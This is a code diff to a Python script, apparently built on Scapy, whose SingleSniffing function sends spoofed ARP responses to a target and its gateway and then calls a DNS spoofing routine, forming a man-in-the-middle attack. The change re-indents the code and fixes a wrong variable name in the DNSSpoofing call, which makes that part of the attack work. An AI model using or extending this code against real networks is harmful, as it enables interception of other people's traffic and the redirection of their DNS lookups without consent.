@@ -25,23 +25,23 @@ def MultiSniffing(ippasserelle):
 
 
 def SingleSniffing(targetip, passerelleip):
-	if str(arping(targetip)[0])[-2] != "0" :
-		targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
-		gatewayip = passerelleip
-		gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
-		try:
-			print("Sending spoofed ARP responses")
-			#while True:
-			spoofarpcache(targetip, targetmac, gatewayip)
-			spoofarpcache(gatewayip, gatewaymac, targetip)
-			DNSSpoofing(iptarget)
-		except KeyboardInterrupt:
-			print("ARP spoofing stopped")
-			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
-			restorearp(targetip, targetmac, gatewayip, gatewaymac)
-			quit()
-	else:
-		print("Ip not reachable")
+    if str(arping(targetip)[0])[-2] != "0" :
+        targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
+        gatewayip = passerelleip
+        gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
+        try:
+            print("Sending spoofed ARP responses")
+            #while True:
+            spoofarpcache(targetip, targetmac, gatewayip)
+            spoofarpcache(gatewayip, gatewaymac, targetip)
+            DNSSpoofing(targetip)
+        except KeyboardInterrupt:
+            print("ARP spoofing stopped")
+            restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
+            restorearp(targetip, targetmac, gatewayip, gatewaymac)
+            quit()
+    else:
+        print("Ip not reachable")
 
 if len(sys.argv) == 1:
     print("Please can you enter the target IP Adress and Passerelle IP")
